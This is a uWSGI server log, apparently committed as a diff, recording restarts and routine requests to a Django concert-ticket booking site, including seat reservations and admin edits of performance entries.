+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x2486520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x2486520 pid: 7829 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 7829)
+spawned uWSGI worker 1 (pid: 17002, cores: 1)
+spawned uWSGI worker 2 (pid: 17003, cores: 1)
+spawned uWSGI worker 3 (pid: 17004, cores: 1)
+spawned uWSGI worker 4 (pid: 17005, cores: 1)
+spawned uWSGI worker 5 (pid: 17006, cores: 1)
+spawned uWSGI worker 6 (pid: 17007, cores: 1)
+spawned uWSGI worker 7 (pid: 17008, cores: 1)
+spawned uWSGI worker 8 (pid: 17009, cores: 1)
+spawned uWSGI worker 9 (pid: 17010, cores: 1)
+spawned uWSGI worker 10 (pid: 17011, cores: 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 05:28:09 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x20a4330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x20a4330 pid: 17089 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 17089)
+spawned uWSGI worker 1 (pid: 17092, cores: 1)
+spawned uWSGI worker 2 (pid: 17093, cores: 1)
+spawned uWSGI worker 3 (pid: 17094, cores: 1)
+spawned uWSGI worker 4 (pid: 17095, cores: 1)
+spawned uWSGI worker 5 (pid: 17096, cores: 1)
+spawned uWSGI worker 6 (pid: 17097, cores: 1)
+spawned uWSGI worker 7 (pid: 17098, cores: 1)
+spawned uWSGI worker 8 (pid: 17099, cores: 1)
+spawned uWSGI worker 9 (pid: 17100, cores: 1)
+spawned uWSGI worker 10 (pid: 17101, cores: 1)
+[pid: 17101|app: 0|req: 1/1] 1.217.129.235 () {44 vars in 858 bytes} [Thu Jun  3 14:28:16 2021] GET / => generated 10420 bytes in 276 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 2/2] 1.217.129.235 () {44 vars in 884 bytes} [Thu Jun  3 14:28:24 2021] GET /users/login => generated 2178 bytes in 55 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 3/3] 1.217.129.235 () {52 vars in 1076 bytes} [Thu Jun  3 14:28:28 2021] POST /users/login => generated 0 bytes in 401 msecs (HTTP/1.1 302) 8 headers in 283 bytes (1 switches on core 0)
+[pid: 17099|app: 0|req: 1/4] 1.217.129.235 () {46 vars in 948 bytes} [Thu Jun  3 14:28:28 2021] GET / => generated 10514 bytes in 291 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 4/5] 1.217.129.235 () {44 vars in 1002 bytes} [Thu Jun  3 14:28:33 2021] GET /category/detail/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 5021 bytes in 138 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 5/6] 1.217.129.235 () {44 vars in 1076 bytes} [Thu Jun  3 14:28:34 2021] GET /category/select_seat/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4787 bytes in 132 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+<QuerySet [<Performance: 오존층 모임>]>
+<QuerySet [{'id': 6, 'title_id': '오존층 모임', 'ageGroup': '12세이상', 'viewingTime': '120분', 'priceVIP': '80,000', 'priceR': '60,000', 'priceS': '35,000', 'info_time': '오후 7시 ~ 오후 9시', 'info_delivery': '현장 수령 또는 배송(등기우편)'}]>
+[pid: 17101|app: 0|req: 6/7] 1.217.129.235 () {52 vars in 1256 bytes} [Thu Jun  3 14:28:36 2021] POST /category/reserved/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4039 bytes in 122 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 7/8] 1.217.129.235 () {44 vars in 975 bytes} [Thu Jun  3 14:28:44 2021] GET / => generated 10514 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 8/9] 1.217.129.235 () {44 vars in 964 bytes} [Thu Jun  3 14:28:46 2021] GET /category/detail/Day%20&%20Night => generated 5012 bytes in 119 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 9/10] 1.217.129.235 () {44 vars in 1005 bytes} [Thu Jun  3 14:28:49 2021] GET /category/select_seat/Day%20&%20Night => generated 4757 bytes in 134 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
+<QuerySet [<Performance: Day & Night>]>
+<QuerySet [{'id': 3, 'title_id': 'Day & Night', 'ageGroup': '15세이상', 'viewingTime': '210분', 'priceVIP': '170,000', 'priceR': '150,000', 'priceS': '120,000', 'info_time': '오후 7시 ~ 오후 11시', 'info_delivery': '현장 수령 또는 배송(등기우편)'}]>
+[pid: 17101|app: 0|req: 10/11] 1.217.129.235 () {52 vars in 1185 bytes} [Thu Jun  3 14:28:51 2021] POST /category/reserved/Day%20&%20Night => generated 4046 bytes in 120 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 17101|app: 0|req: 11/12] 1.217.129.235 () {44 vars in 939 bytes} [Thu Jun  3 14:28:53 2021] GET / => generated 10514 bytes in 133 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 8 buried after 2 seconds
+worker 10 buried after 2 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 14:32:56 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x1b85520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1b85520 pid: 17089 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 17089)
+spawned uWSGI worker 1 (pid: 17500, cores: 1)
+spawned uWSGI worker 2 (pid: 17501, cores: 1)
+spawned uWSGI worker 3 (pid: 17502, cores: 1)
+spawned uWSGI worker 4 (pid: 17503, cores: 1)
+spawned uWSGI worker 5 (pid: 17504, cores: 1)
+spawned uWSGI worker 6 (pid: 17505, cores: 1)
+spawned uWSGI worker 7 (pid: 17506, cores: 1)
+spawned uWSGI worker 8 (pid: 17507, cores: 1)
+spawned uWSGI worker 9 (pid: 17508, cores: 1)
+spawned uWSGI worker 10 (pid: 17509, cores: 1)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 05:39:44 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x17e5330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x17e5330 pid: 2890 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 2890)
+spawned uWSGI worker 1 (pid: 3135, cores: 1)
+spawned uWSGI worker 2 (pid: 3136, cores: 1)
+spawned uWSGI worker 3 (pid: 3137, cores: 1)
+spawned uWSGI worker 4 (pid: 3138, cores: 1)
+spawned uWSGI worker 5 (pid: 3139, cores: 1)
+spawned uWSGI worker 6 (pid: 3140, cores: 1)
+spawned uWSGI worker 7 (pid: 3141, cores: 1)
+spawned uWSGI worker 8 (pid: 3142, cores: 1)
+spawned uWSGI worker 9 (pid: 3143, cores: 1)
+spawned uWSGI worker 10 (pid: 3144, cores: 1)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 14:48:19 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xa9f520
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xa9f520 pid: 2890 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+gracefully (RE)spawned uWSGI master process (pid: 2890)
+spawned uWSGI worker 1 (pid: 3457, cores: 1)
+spawned uWSGI worker 2 (pid: 3458, cores: 1)
+spawned uWSGI worker 3 (pid: 3459, cores: 1)
+spawned uWSGI worker 4 (pid: 3460, cores: 1)
+spawned uWSGI worker 5 (pid: 3461, cores: 1)
+spawned uWSGI worker 6 (pid: 3462, cores: 1)
+spawned uWSGI worker 7 (pid: 3463, cores: 1)
+spawned uWSGI worker 8 (pid: 3464, cores: 1)
+spawned uWSGI worker 9 (pid: 3465, cores: 1)
+spawned uWSGI worker 10 (pid: 3466, cores: 1)
+[pid: 3466|app: 0|req: 1/1] 1.217.129.235 () {40 vars in 739 bytes} [Thu Jun  3 14:49:25 2021] GET / => generated 10420 bytes in 714 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3465|app: 0|req: 1/2] 1.217.129.235 () {40 vars in 691 bytes} [Thu Jun  3 14:49:26 2021] GET /favicon.ico => generated 179 bytes in 111 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3466|app: 0|req: 2/3] 1.217.129.235 () {42 vars in 871 bytes} [Thu Jun  3 14:49:29 2021] GET /category/detail/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4950 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3465|app: 0|req: 2/4] 1.217.129.235 () {42 vars in 887 bytes} [Thu Jun  3 14:49:34 2021] GET /category/detail/%EB%B0%95%ED%9A%A8%EC%8B%A0,%20Soul%20Tree,%20Lovers => generated 4956 bytes in 194 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 3466|app: 0|req: 3/5] 1.217.129.235 () {42 vars in 871 bytes} [Thu Jun  3 14:49:41 2021] GET /category/detail/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84 => generated 4950 bytes in 101 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 05:49:48 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0x1cb6330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1cb6330 pid: 3472 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 3472)
+spawned uWSGI worker 1 (pid: 3475, cores: 1)
+spawned uWSGI worker 2 (pid: 3476, cores: 1)
+spawned uWSGI worker 3 (pid: 3477, cores: 1)
+spawned uWSGI worker 4 (pid: 3478, cores: 1)
+spawned uWSGI worker 5 (pid: 3479, cores: 1)
+spawned uWSGI worker 6 (pid: 3480, cores: 1)
+spawned uWSGI worker 7 (pid: 3481, cores: 1)
+spawned uWSGI worker 8 (pid: 3482, cores: 1)
+spawned uWSGI worker 9 (pid: 3483, cores: 1)
+spawned uWSGI worker 10 (pid: 3484, cores: 1)
+[pid: 3477|app: 0|req: 1/1] 1.217.129.235 () {40 vars in 749 bytes} [Thu Jun  3 14:49:48 2021] GET /admin => generated 0 bytes in 98 msecs (HTTP/1.1 301) 5 headers in 175 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 1/2] 1.217.129.235 () {40 vars in 751 bytes} [Thu Jun  3 14:49:48 2021] GET /admin/ => generated 0 bytes in 123 msecs (HTTP/1.1 302) 9 headers in 331 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 1/3] 1.217.129.235 () {40 vars in 788 bytes} [Thu Jun  3 14:49:48 2021] GET /admin/login/?next=/admin/ => generated 2411 bytes in 343 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 2/4] 1.217.129.235 () {52 vars in 1120 bytes} [Thu Jun  3 14:49:53 2021] POST /admin/login/?next=/admin/ => generated 0 bytes in 443 msecs (HTTP/1.1 302) 11 headers in 569 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 2/5] 1.217.129.235 () {46 vars in 976 bytes} [Thu Jun  3 14:49:53 2021] GET /admin/ => generated 8706 bytes in 150 msecs (HTTP/1.1 200) 8 headers in 293 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 3/6] 1.217.129.235 () {44 vars in 968 bytes} [Thu Jun  3 14:49:56 2021] GET /admin/category/performance/ => generated 9555 bytes in 287 msecs (HTTP/1.1 200) 9 headers in 461 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 3/7] 1.217.129.235 () {42 vars in 794 bytes} [Thu Jun  3 14:49:56 2021] GET /admin/jsi18n/ => generated 8330 bytes in 118 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 4/8] 1.217.129.235 () {44 vars in 1069 bytes} [Thu Jun  3 14:49:58 2021] GET /admin/category/performance/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84/change/ => generated 10544 bytes in 153 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 4/9] 1.217.129.235 () {42 vars in 850 bytes} [Thu Jun  3 14:49:58 2021] GET /admin/jsi18n/ => generated 8330 bytes in 125 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 5/10] 1.217.129.235 () {52 vars in 1383 bytes} [Thu Jun  3 14:50:04 2021] POST /admin/category/performance/%EC%98%A4%EC%A1%B4%EC%B8%B5%20%EB%AA%A8%EC%9E%84/change/ => generated 0 bytes in 1265 msecs (HTTP/1.1 302) 10 headers in 709 bytes (2 switches on core 0)
+[pid: 3483|app: 0|req: 5/11] 1.217.129.235 () {46 vars in 1407 bytes} [Thu Jun  3 14:50:05 2021] GET /admin/category/performance/ => generated 9827 bytes in 149 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 6/12] 1.217.129.235 () {42 vars in 794 bytes} [Thu Jun  3 14:50:05 2021] GET /admin/jsi18n/ => generated 8330 bytes in 120 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 6/13] 1.217.129.235 () {42 vars in 872 bytes} [Thu Jun  3 14:50:08 2021] GET / => generated 10420 bytes in 124 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 7/14] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:50:10 2021] GET / => generated 10420 bytes in 136 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 8/15] 1.217.129.235 () {44 vars in 1035 bytes} [Thu Jun  3 14:50:43 2021] GET /admin/category/performance/Day%20_26%20Night/change/ => generated 10524 bytes in 153 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 7/16] 1.217.129.235 () {42 vars in 819 bytes} [Thu Jun  3 14:50:43 2021] GET /admin/jsi18n/ => generated 8330 bytes in 125 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 9/17] 1.217.129.235 () {52 vars in 1314 bytes} [Thu Jun  3 14:51:29 2021] POST /admin/category/performance/Day%20_26%20Night/change/ => generated 0 bytes in 866 msecs (HTTP/1.1 302) 10 headers in 671 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 8/18] 1.217.129.235 () {46 vars in 1338 bytes} [Thu Jun  3 14:51:30 2021] GET /admin/category/performance/ => generated 9795 bytes in 136 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 10/19] 1.217.129.235 () {42 vars in 794 bytes} [Thu Jun  3 14:51:30 2021] GET /admin/jsi18n/ => generated 8330 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 9/20] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:32 2021] GET / => generated 10453 bytes in 120 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 11/21] 1.217.129.235 () {44 vars in 1035 bytes} [Thu Jun  3 14:51:38 2021] GET /admin/category/performance/Day%20_26%20Night/change/ => generated 10557 bytes in 134 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 10/22] 1.217.129.235 () {42 vars in 819 bytes} [Thu Jun  3 14:51:39 2021] GET /admin/jsi18n/ => generated 8330 bytes in 121 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 12/23] 1.217.129.235 () {52 vars in 1314 bytes} [Thu Jun  3 14:51:42 2021] POST /admin/category/performance/Day%20_26%20Night/change/ => generated 0 bytes in 126 msecs (HTTP/1.1 302) 10 headers in 671 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 11/24] 1.217.129.235 () {46 vars in 1338 bytes} [Thu Jun  3 14:51:42 2021] GET /admin/category/performance/ => generated 9795 bytes in 128 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 13/25] 1.217.129.235 () {42 vars in 794 bytes} [Thu Jun  3 14:51:42 2021] GET /admin/jsi18n/ => generated 8330 bytes in 114 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 12/26] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:43 2021] GET / => generated 10455 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 14/27] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:45 2021] GET / => generated 10455 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 13/28] 1.217.129.235 () {44 vars in 1035 bytes} [Thu Jun  3 14:51:49 2021] GET /admin/category/performance/Day%20_26%20Night/change/ => generated 10559 bytes in 184 msecs (HTTP/1.1 200) 9 headers in 462 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 15/29] 1.217.129.235 () {42 vars in 819 bytes} [Thu Jun  3 14:51:50 2021] GET /admin/jsi18n/ => generated 8330 bytes in 122 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 14/30] 1.217.129.235 () {52 vars in 1314 bytes} [Thu Jun  3 14:51:54 2021] POST /admin/category/performance/Day%20_26%20Night/change/ => generated 0 bytes in 141 msecs (HTTP/1.1 302) 10 headers in 671 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 16/31] 1.217.129.235 () {46 vars in 1338 bytes} [Thu Jun  3 14:51:54 2021] GET /admin/category/performance/ => generated 9795 bytes in 142 msecs (HTTP/1.1 200) 10 headers in 559 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 15/32] 1.217.129.235 () {42 vars in 794 bytes} [Thu Jun  3 14:51:54 2021] GET /admin/jsi18n/ => generated 8330 bytes in 122 msecs (HTTP/1.1 200) 6 headers in 189 bytes (1 switches on core 0)
+[pid: 3484|app: 0|req: 17/33] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:55 2021] GET / => generated 10457 bytes in 127 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3483|app: 0|req: 16/34] 1.217.129.235 () {44 vars in 903 bytes} [Thu Jun  3 14:51:57 2021] GET / => generated 10457 bytes in 121 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+Thu Jun  3 14:51:58 2021 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 1.217.129.235) !!!
